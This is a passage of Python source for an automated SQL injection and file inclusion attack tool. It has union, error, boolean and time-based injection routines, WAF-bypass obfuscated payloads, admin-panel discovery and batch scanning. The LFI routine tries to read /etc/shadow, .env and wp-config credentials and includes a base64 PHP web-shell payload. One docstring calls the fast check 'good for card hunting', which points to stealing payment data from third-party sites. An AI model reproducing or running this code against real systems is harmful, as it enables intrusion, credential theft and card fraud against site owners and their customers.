                test_cols[injectable_col] = f"CONCAT({unique_start},0x7c,({query}),0x7c,{unique_end})"
            
            union_query = f"' UNION ALL SELECT {','.join(test_cols)}-- -"
            test_params = params.copy()
            original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
            test_params[param_name] = [f"{original}{union_query}"]
            test_url = self._build_url(base, test_params)
            
            body, _ = await self._fetch(test_url, session)
            if body:
                start_hex = unique_start.replace("0x", "")
                end_hex = unique_end.replace("0x", "")
                match = re.search(rf"{start_hex}\|(.+?)\|{end_hex}", body)
                if match:
                    setattr(result, attr, match.group(1))
                    logger.info(f"Extracted {attr}: {match.group(1)}")
        
        result.payload_used = f"UNION ALL SELECT with {column_count} columns"
        return result

    async def test_time_based(self, url: str, param_name: str, 
                               session: aiohttp.ClientSession) -> Optional[SQLiResult]:
        """Test time-based blind SQL injection.
        
        Returns:
            SQLiResult if vulnerable, None otherwise
        """
        base, params = self._parse_url(url)
        delay = self.delay
        
        # Get baseline response time
        _, baseline_time = await self._fetch(url, session)
        
        for dbms, payloads in self.TIME_PAYLOADS.items():
            for payload_template in payloads[:2]:  # Test first 2 per DBMS
                payload = payload_template.format(delay=delay)
                
                test_params = params.copy()
                original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
                test_params[param_name] = [str(original) + payload]
                test_url = self._build_url(base, test_params)
                
                _, elapsed = await self._fetch(test_url, session)
                
                # If response took significantly longer than baseline + delay threshold
                if elapsed >= delay * 0.8 and elapsed > baseline_time + (delay * 0.5):
                    # Confirm with a second test
                    _, elapsed2 = await self._fetch(test_url, session)
                    if elapsed2 >= delay * 0.7:
                        result = SQLiResult(
                            url=url,
                            parameter=param_name,
                            vulnerable=True,
                            injection_type="time",
                            dbms=dbms,
                            technique=f"Time-based blind ({delay}s delay)",
                            payload_used=payload,
                            confidence=0.75,
                        )
                        logger.info(f"Time-based SQLi found: {url} param={param_name} dbms={dbms}")
                        return result
        
        return None

    async def test_boolean_based(self, url: str, param_name: str,
                                  session: aiohttp.ClientSession) -> Optional[SQLiResult]:
        """Test boolean-based blind SQL injection.
        
        Compares responses between true/false conditions.
        
        Returns:
            SQLiResult if vulnerable, None otherwise
        """
        base, params = self._parse_url(url)
        
        # Get original response
        original_body, _ = await self._fetch(url, session)
        if not original_body:
            return None
        original_len = len(original_body)
        
        # Test pairs: (true_condition, false_condition)
        test_pairs = [
            ("' AND '1'='1", "' AND '1'='2"),
            (" AND 1=1", " AND 1=2"),
            ("' AND 1=1-- -", "' AND 1=2-- -"),
            (" AND 1=1-- -", " AND 1=2-- -"),
            ("') AND ('1'='1", "') AND ('1'='2"),
        ]
        
        for true_payload, false_payload in test_pairs:
            # Test true condition
            true_params = params.copy()
            original = true_params[param_name][0] if isinstance(true_params[param_name], list) else true_params[param_name]
            true_params[param_name] = [str(original) + true_payload]
            true_url = self._build_url(base, true_params)
            true_body, _ = await self._fetch(true_url, session)
            
            # Test false condition
            false_params = params.copy()
            false_params[param_name] = [str(original) + false_payload]
            false_url = self._build_url(base, false_params)
            false_body, _ = await self._fetch(false_url, session)
            
            if not true_body or not false_body:
                continue
            
            true_len = len(true_body)
            false_len = len(false_body)
            
            # True response should be similar to original, false should differ
            true_diff = abs(true_len - original_len) / max(original_len, 1)
            false_diff = abs(false_len - original_len) / max(original_len, 1)
            
            if true_diff < 0.1 and false_diff > 0.2:
                result = SQLiResult(
                    url=url,
                    parameter=param_name,
                    vulnerable=True,
                    injection_type="boolean",
                    dbms=self._detect_dbms(true_body) or "unknown",
                    technique="Boolean-based blind",
                    payload_used=f"TRUE: {true_payload} | FALSE: {false_payload}",
                    confidence=0.70,
                )
                logger.info(f"Boolean-based SQLi found: {url} param={param_name}")
                return result
        
        return None

    async def scan(self, url: str, session: aiohttp.ClientSession = None) -> List[SQLiResult]:
        """Full SQL injection scan of a URL.
        
        Tests all parameters with heuristic, error-based, union-based,
        boolean-based, and time-based techniques.
        
        Args:
            url: Target URL with parameters
            session: Optional aiohttp session
            
        Returns:
            List of SQLiResult for each finding
        """
        results = []
        own_session = False
        
        try:
            if session is None:
                session = aiohttp.ClientSession(
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    headers={"User-Agent": self.user_agent}
                )
                own_session = True
            
            base, params = self._parse_url(url)
            if not params:
                logger.debug(f"No parameters found in URL: {url}")
                return results
            
            for param_name in params:
                logger.info(f"Testing parameter '{param_name}' in {url}")
                
                # Step 1: Heuristic check
                injectable, dbms, _ = await self.test_heuristic(url, session)
                if not injectable:
                    continue
                
                if not dbms:
                    dbms = "mysql"  # Default assumption
                
                # Step 2: Error-based test
                error_result = await self.test_error_based(url, param_name, dbms, session)
                if error_result:
                    results.append(error_result)
                    continue  # Found vuln, skip other tests for this param
                
                # Step 3: Union-based test
                union_result = await self.test_union_based(url, param_name, dbms, session)
                if union_result:
                    results.append(union_result)
                    continue
                
                # Step 4: Boolean-based test
                boolean_result = await self.test_boolean_based(url, param_name, session)
                if boolean_result:
                    results.append(boolean_result)
                    continue
                
                # Step 5: Time-based test (last resort - slowest)
                time_result = await self.test_time_based(url, param_name, session)
                if time_result:
                    results.append(time_result)
        
        except Exception as e:
            logger.error(f"Scan error for {url}: {e}")
        finally:
            if own_session and session:
                await session.close()
        
        return results

    async def test_sqli_fast(self, url: str, session: aiohttp.ClientSession = None) -> bool:
        """Quick SQLi vulnerability test.
        
        Does a fast heuristic check to determine if URL is likely injectable.
        Much faster than full scan() - good for card hunting pre-check.
        
        Args:
            url: Target URL with parameters
            session: Optional aiohttp session
            
        Returns:
            True if URL appears vulnerable, False otherwise
        """
        own_session = False
        
        try:
            if session is None:
                session = aiohttp.ClientSession(
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    headers={"User-Agent": self.user_agent}
                )
                own_session = True
            
            base, params = self._parse_url(url)
            if not params:
                logger.debug(f"No parameters found in URL: {url}")
                return False
            
            # Quick heuristic test
            injectable, dbms, _ = await self.test_heuristic(url, session)
            if injectable:
                logger.info(f"✅ Fast test: {url} appears vulnerable ({dbms or 'unknown'})")
                return True
            
            # Try a quick error-based test on first param
            first_param = list(params.keys())[0]
            test_payloads = ["'", "\"", "1'", "1\"", "1 OR 1=1", "1' OR '1'='1"]
            
            # Get original page to compare against (avoid matching existing text)
            original_text = ""
            try:
                async with session.get(url) as orig_resp:
                    original_text = (await orig_resp.text()).lower()
            except:
                pass
            
            # SQL error signatures — must be specific enough to avoid FPs
            error_sigs = [
                "you have an error in your sql syntax",
                "mysql_fetch",
                "mysql_num_rows",
                "pg_query",
                "pg_exec",
                "syntax error at or near",
                "unclosed quotation mark",
                "sqlstate[",
                "odbc sql server driver",
                "microsoft ole db provider",
                "ora-00933",
                "ora-01756",
                "ora-01747",
                "sqlite3::",
                "sqlite_error",
                "fatal error</b>:  mysql",
                "warning</b>:  mysql",
                "warning</b>:  pg_",
                "warning</b>:  sqlite",
                "supplied argument is not a valid mysql",
                "valid postgresql result",
            ]
            
            for payload in test_payloads:
                test_params = params.copy()
                original = test_params[first_param][0] if isinstance(test_params[first_param], list) else test_params[first_param]
                test_params[first_param] = [str(original) + payload]
                test_url = self._build_url(base, test_params)
                try:
                    async with session.get(test_url) as resp:
                        text = await resp.text()
                        text_lower = text.lower()
                        for sig in error_sigs:
                            # Only flag if error appears in injected response but NOT in original
                            if sig in text_lower and sig not in original_text:
                                logger.info(f"✅ Fast test: {url} vulnerable (error: {sig})")
                                return True
                except:
                    continue
            
            return False
            
        except Exception as e:
            logger.error(f"Fast SQLi test error for {url}: {e}")
            return False
        finally:
            if own_session and session:
                await session.close()

    async def test_waf_bypass_union(self, url: str, param_name: str, dbms: str,
                                     session: aiohttp.ClientSession) -> Optional[SQLiResult]:
        """Test union-based SQLi with WAF bypass obfuscation.
        
        Uses mixed case, inline comments, and URL encoded bypasses
        from SQLi Dumper techniques.
        
        Returns:
            SQLiResult if vulnerable, None otherwise
        """
        base, params = self._parse_url(url)
        
        # First determine column count with obfuscated ORDER BY
        column_count = 0
        for i in range(1, 30):
            test_params = params.copy()
            original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
            # Obfuscated ORDER BY
            test_params[param_name] = [f"{original}'/**/oRdEr/**/bY/**/{i}-- -"]
            test_url = self._build_url(base, test_params)
            
            body, _ = await self._fetch(test_url, session)
            if not body:
                continue
            
            if any(p.search(body) for patterns in self.DBMS_ERRORS.values() for p in patterns):
                column_count = i - 1
                break
        
        if column_count < 1:
            # Try numeric injection
            for i in range(1, 20):
                test_params = params.copy()
                original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
                test_params[param_name] = [f"999999.9/**/oRdEr/**/bY/**/{i}-- -"]
                test_url = self._build_url(base, test_params)
                
                body, _ = await self._fetch(test_url, session)
                if body and any(p.search(body) for patterns in self.DBMS_ERRORS.values() for p in patterns):
                    column_count = i - 1
                    break
        
        if column_count < 1:
            return None
        
        logger.info(f"WAF bypass: Found {column_count} columns for {url}")
        
        # Build column list with markers
        marker = f"0x{random.randint(100000, 999999):x}"
        null_list = ["nUlL"] * column_count  # Mixed case NULL
        injectable_cols = []
        
        # Try WAF bypass union payloads
        for payload_template in self.WAF_BYPASS_UNION_PAYLOADS[:15]:
            if "{cols_concat}" in payload_template:
                continue  # Skip concat versions for now
            
            for col_idx in range(column_count):
                test_cols = null_list.copy()
                test_cols[col_idx] = f"cOnCaT({marker},0x7e,{marker})"
                
                payload = payload_template.format(cols=",".join(test_cols))
                
                test_params = params.copy()
                original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
                test_params[param_name] = [payload]
                test_url = self._build_url(base, test_params)
                
                body, _ = await self._fetch(test_url, session)
                if body and marker.replace("0x", "") in body:
                    injectable_cols.append(col_idx)
                    logger.info(f"WAF bypass: Injectable column {col_idx} found with: {payload_template[:40]}...")
                    break
            
            if injectable_cols:
                break
        
        if not injectable_cols:
            return None
        
        result = SQLiResult(
            url=url,
            parameter=param_name,
            vulnerable=True,
            injection_type="union",
            dbms=dbms,
            technique="WAF Bypass UNION (SQLi Dumper)",
            column_count=column_count,
            injectable_columns=injectable_cols,
            confidence=0.88,
            payload_used=f"WAF bypass UNION with {column_count} columns"
        )
        
        # Extract info using obfuscated queries
        injectable_col = injectable_cols[0]
        unique_start = f"0x{random.randint(100000, 999999):x}"
        unique_end = f"0x{random.randint(100000, 999999):x}"
        
        # Try to get version
        test_cols = null_list.copy()
        test_cols[injectable_col] = f"cOnCaT({unique_start},0x7c,vErSiOn(),0x7c,{unique_end})"
        payload = f"-1'/**/uNiOn/**/aLl/**/sElEcT/**/{','.join(test_cols)}-- -"
        
        test_params = params.copy()
        test_params[param_name] = [payload]
        test_url = self._build_url(base, test_params)
        body, _ = await self._fetch(test_url, session)
        
        if body:
            start_hex = unique_start.replace("0x", "")
            end_hex = unique_end.replace("0x", "")
            match = re.search(rf"{start_hex}\|(.+?)\|{end_hex}", body)
            if match:
                result.db_version = match.group(1)
        
        return result

    async def test_waf_bypass_error(self, url: str, param_name: str, dbms: str,
                                     session: aiohttp.ClientSession) -> Optional[SQLiResult]:
        """Test error-based SQLi with WAF bypass obfuscation.
        
        Returns:
            SQLiResult if vulnerable, None otherwise
        """
        base, params = self._parse_url(url)
        payloads = self.WAF_BYPASS_ERROR_PAYLOADS.get(dbms, self.WAF_BYPASS_ERROR_PAYLOADS.get("mysql", []))
        
        for payload in payloads:
            test_params = params.copy()
            original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
            test_params[param_name] = [str(original) + payload]
            test_url = self._build_url(base, test_params)
            
            body, _ = await self._fetch(test_url, session)
            if not body:
                continue
            
            extracted = self._extract_error_data(body)
            if extracted:
                result = SQLiResult(
                    url=url,
                    parameter=param_name,
                    vulnerable=True,
                    injection_type="error",
                    dbms=dbms,
                    technique="WAF Bypass Error-based (SQLi Dumper)",
                    payload_used=payload[:60] + "...",
                    confidence=0.92,
                )
                
                val = extracted.get("extracted", "")
                if "version" in payload.lower():
                    result.db_version = val
                elif "database" in payload.lower():
                    result.current_db = val
                elif "user" in payload.lower():
                    result.current_user = val
                
                logger.info(f"WAF bypass error-based found: {url} extracted={val}")
                return result
        
        return None

    async def find_admin_panels(self, base_url: str, session: aiohttp.ClientSession = None,
                                 max_concurrent: int = 20) -> List[str]:
        """Find admin panel paths on a target.
        
        Uses SQLi Dumper dictionary of 100+ admin paths.
        
        Args:
            base_url: Base URL of the target (e.g., https://example.com)
            session: Optional aiohttp session
            max_concurrent: Max concurrent requests
            
        Returns:
            List of valid admin panel URLs found
        """
        own_session = False
        found_panels = []
        
        # Normalize base URL
        if not base_url.startswith(('http://', 'https://')):
            base_url = f"https://{base_url}"
        base_url = base_url.rstrip('/')
        
        try:
            if session is None:
                session = aiohttp.ClientSession(
                    timeout=aiohttp.ClientTimeout(total=10),
                    headers={"User-Agent": self.user_agent}
                )
                own_session = True
            
            sem = asyncio.Semaphore(max_concurrent)
            
            async def check_path(path: str) -> Optional[str]:
                async with sem:
                    url = f"{base_url}/{path}"
                    try:
                        async with session.get(url, allow_redirects=False, ssl=False) as resp:
                            if resp.status in (200, 301, 302, 303, 307, 308):
                                # Check if it's a real admin page, not just redirect to home
                                if resp.status == 200:
                                    body = await resp.text(errors="ignore")
                                    body_lower = body.lower()
                                    # Check for admin-related keywords
                                    admin_indicators = [
                                        "login", "password", "username", "admin",
                                        "sign in", "log in", "authenticate",
                                        "dashboard", "control panel", "管理"
                                    ]
                                    if any(ind in body_lower for ind in admin_indicators):
                                        logger.info(f"Admin panel found: {url}")
                                        return url
                                elif resp.status in (301, 302, 303, 307, 308):
                                    # Check redirect target
                                    location = resp.headers.get('Location', '')
                                    if 'login' in location.lower() or 'admin' in location.lower():
                                        logger.info(f"Admin panel redirect found: {url} -> {location}")
                                        return url
                    except Exception as e:
                        logger.debug(f"Admin check failed for {url}: {e}")
                    return None
            
            # Check all paths concurrently
            tasks = [check_path(path) for path in self.ADMIN_PATHS]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            found_panels = [r for r in results if r and not isinstance(r, Exception)]
        
        finally:
            if own_session and session:
                await session.close()
        
        return found_panels

    async def test_lfi(self, url: str, session: aiohttp.ClientSession = None,
                       max_concurrent: int = 20) -> Dict:
        """Test for Local/Remote File Inclusion vulnerabilities.
        
        Uses SQLi Dumper dic_file_dump.txt - 206 sensitive system file paths.
        Tries various LFI techniques: direct, null byte, path traversal, wrappers.
        
        Args:
            url: URL with file parameter (e.g., https://example.com/page.php?file=test)
            session: Optional aiohttp session
            max_concurrent: Max concurrent requests
            
        Returns:
            Dict with vulnerable files and their contents
        """
        own_session = False
        results = {
            "vulnerable": False,
            "url": url,
            "technique": None,
            "files_found": [],
            "sensitive_data": []
        }
        
        # LFI payloads with various techniques
        lfi_techniques = [
            # Direct
            "{file}",
            # Null byte (older PHP)
            "{file}%00",
            "{file}\x00",
            # Path traversal
            "../{file}",
            "../../{file}",
            "../../../{file}",
            "../../../../{file}",
            "../../../../../{file}",
            "../../../../../../{file}",
            "../../../../../../../{file}",
            "....//....//....//....//....//....//....//..../{file}",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f{file}",
            # PHP wrappers
            "php://filter/read=convert.base64-encode/resource={file}",
            "php://filter/convert.base64-encode/resource={file}",
            # Data wrapper (RCE potential)
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            # Expect wrapper (RCE potential)
            "expect://id",
        ]
        
        # Sensitive file indicators
        file_indicators = {
            "/etc/passwd": ["root:", "daemon:", "nobody:", "/bin/bash", "/bin/sh"],
            "/etc/shadow": ["root:", "$1$", "$5$", "$6$", "$y$"],
            "/proc/self/environ": ["PATH=", "HOME=", "USER=", "SHELL="],
            "wp-config.php": ["DB_NAME", "DB_USER", "DB_PASSWORD", "table_prefix"],
            "config.php": ["db_host", "db_user", "db_pass", "database"],
            ".env": ["DB_PASSWORD", "APP_KEY", "SECRET", "API_KEY"],
            ".htaccess": ["RewriteEngine", "RewriteRule", "AuthType"],
            "php.ini": ["display_errors", "log_errors", "error_reporting"],
            "httpd.conf": ["ServerRoot", "DocumentRoot", "VirtualHost"],
            "my.cnf": ["mysqld", "datadir", "socket"],
        }
        
        try:
            if session is None:
                session = aiohttp.ClientSession(
                    timeout=aiohttp.ClientTimeout(total=10),
                    headers={"User-Agent": self.user_agent}
                )
                own_session = True
            
            # Parse URL to find file parameter
            base, params = self._parse_url(url)
            file_params = ["file", "page", "include", "path", "doc", "document", 
                          "folder", "root", "pg", "style", "pdf", "template",
                          "php_path", "mod", "conf", "load", "read"]
            
            target_param = None
            for p in file_params:
                if p in params:
                    target_param = p
                    break
            
            if not target_param and params:
                target_param = list(params.keys())[0]
            
            if not target_param:
                return results
            
            sem = asyncio.Semaphore(max_concurrent)
            
            async def check_lfi(file_path: str, technique: str) -> Optional[Dict]:
                async with sem:
                    payload = technique.replace("{file}", file_path)
                    test_params = params.copy()
                    test_params[target_param] = [payload]
                    test_url = self._build_url(base, test_params)
                    
                    try:
                        async with session.get(test_url, allow_redirects=True, ssl=False) as resp:
                            if resp.status == 200:
                                body = await resp.text(errors="ignore")
                                body_stripped = body.strip().lower()
                                
                                # CRITICAL: Reject HTML pages - LFI returns RAW file content
                                # If response is an HTML document, it's NOT valid LFI
                                is_html_page = (
                                    body_stripped.startswith('<!doctype') or
                                    body_stripped.startswith('<html') or
                                    body_stripped.startswith('<?xml') or
                                    body_stripped.startswith('<head') or
                                    ('<html' in body_stripped[:500] and '</html>' in body_stripped[-500:]) or
                                    ('<head>' in body_stripped[:1000] and '<body' in body_stripped[:2000])
                                )
                                
                                if is_html_page:
                                    # Only exception: if we see ACTUAL PHP source code exposed
                                    # Real LFI of wp-config shows: <?php followed by define('DB_
                                    has_php_source = (
                                        "<?php" in body[:200] or  # PHP tag at start
                                        ("define(" in body and "'DB_" in body) or  # WP config defines
                                        ("define(" in body and "'AUTH_" in body) or  # WP auth keys
                                        ("<?" in body[:50] and "<?xml" not in body[:50])  # Short PHP tag
                                    )
                                    if not has_php_source:
                                        return None  # It's just a normal HTML page, not LFI
                                
                                # Check for file indicators
                                for indicator_file, indicators in file_indicators.items():
                                    if indicator_file in file_path or any(
                                        ind in file_path for ind in [
                                            "passwd", "shadow", "environ", "config", ".env", ".htaccess"
                                        ]
                                    ):
                                        for ind in indicators:
                                            if ind in body:
                                                return {
                                                    "file": file_path,
                                                    "url": test_url,
                                                    "technique": technique,
                                                    "content_preview": body[:500],
                                                    "indicator": ind
                                                }
                                
                                # Base64 decode for PHP filter wrapper
                                if "base64-encode" in technique and len(body) > 50:
                                    try:
                                        import base64
                                        decoded = base64.b64decode(body).decode('utf-8', errors='ignore')
                                        if any(ind in decoded for indicators in file_indicators.values() 
                                               for ind in indicators):
                                            return {
                                                "file": file_path,
                                                "url": test_url,
                                                "technique": technique + " (base64 decoded)",
                                                "content_preview": decoded[:500],
                                            }
                                    except:
                                        pass
                    except:
                        pass
                    return None
            
            # Test priority files first
            priority_files = [
                "/etc/passwd", "/etc/shadow", "/proc/self/environ",
                "wp-config.php", "config.php", ".env", "../.env",
                "../../wp-config.php", "../../../wp-config.php"
            ]
            
            tasks = []
            for file_path in priority_files:
                for technique in lfi_techniques[:8]:  # Use first 8 techniques
                    tasks.append(check_lfi(file_path, technique))
            
            quick_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for r in quick_results:
                if r and not isinstance(r, Exception):
                    results["vulnerable"] = True
                    results["technique"] = r.get("technique")
                    results["files_found"].append(r)
                    
                    # Extract sensitive data
                    content = r.get("content_preview", "")
                    if "root:" in content:
                        results["sensitive_data"].append("Linux passwd file exposed")
                    if "DB_PASSWORD" in content or "db_pass" in content:
                        results["sensitive_data"].append("Database credentials exposed")
                    if "APP_KEY" in content or "SECRET" in content:
                        results["sensitive_data"].append("Application secrets exposed")
            
            # If not found, try full file list
            if not results["vulnerable"]:
                all_tasks = []
                for file_path in self.LFI_PATHS[:50]:  # Test first 50 paths
                    all_tasks.append(check_lfi(file_path, "../../../../../../..{file}"))
                    all_tasks.append(check_lfi(file_path, "{file}"))
                
                full_results = await asyncio.gather(*all_tasks, return_exceptions=True)
                
                for r in full_results:
                    if r and not isinstance(r, Exception):
                        results["vulnerable"] = True
                        results["technique"] = r.get("technique")
                        results["files_found"].append(r)
                        break  # Found one, that's enough
        
        finally:
            if own_session and session:
                await session.close()
        
        return results

    async def scan_with_waf_bypass(self, url: str, session: aiohttp.ClientSession = None) -> List[SQLiResult]:
        """Full scan with WAF bypass fallback.
        
        First tries standard techniques, then WAF bypass if blocked.
        
        Args:
            url: Target URL with parameters
            session: Optional aiohttp session
            
        Returns:
            List of SQLiResult for each finding
        """
        results = []
        own_session = False
        
        try:
            if session is None:
                session = aiohttp.ClientSession(
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    headers={"User-Agent": self.user_agent}
                )
                own_session = True
            
            base, params = self._parse_url(url)
            if not params:
                return results
            
            for param_name in params:
                logger.info(f"Testing parameter '{param_name}' with WAF bypass in {url}")
                
                # Heuristic check
                injectable, dbms, _ = await self.test_heuristic(url, session)
                if not dbms:
                    dbms = "mysql"
                
                # Try standard error-based first
                error_result = await self.test_error_based(url, param_name, dbms, session)
                if error_result:
                    results.append(error_result)
                    continue
                
                # Try WAF bypass error-based
                waf_error_result = await self.test_waf_bypass_error(url, param_name, dbms, session)
                if waf_error_result:
                    results.append(waf_error_result)
                    continue
                
                # Try standard union
                union_result = await self.test_union_based(url, param_name, dbms, session)
                if union_result:
                    results.append(union_result)
                    continue
                
                # Try WAF bypass union
                waf_union_result = await self.test_waf_bypass_union(url, param_name, dbms, session)
                if waf_union_result:
                    results.append(waf_union_result)
                    continue
                
                # Boolean and time-based as last resort
                boolean_result = await self.test_boolean_based(url, param_name, session)
                if boolean_result:
                    results.append(boolean_result)
                    continue
                
                time_result = await self.test_time_based(url, param_name, session)
                if time_result:
                    results.append(time_result)
        
        except Exception as e:
            logger.error(f"WAF bypass scan error for {url}: {e}")
        finally:
            if own_session and session:
                await session.close()
        
        return results

    async def batch_scan(self, urls: List[str]) -> List[SQLiResult]:
        """Scan multiple URLs for SQL injection.
        
        Args:
            urls: List of target URLs
            
        Returns:
            Combined list of all SQLi findings
        """
        all_results = []
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            headers={"User-Agent": self.user_agent}
        ) as session:
            for url in urls:
                try:
                    results = await self.scan(url, session)
                    all_results.extend(results)
                    
                    # Small delay between targets
                    await asyncio.sleep(random.uniform(0.5, 1.5))
                except Exception as e:
                    logger.error(f"Batch scan error for {url}: {e}")
        
        return all_results
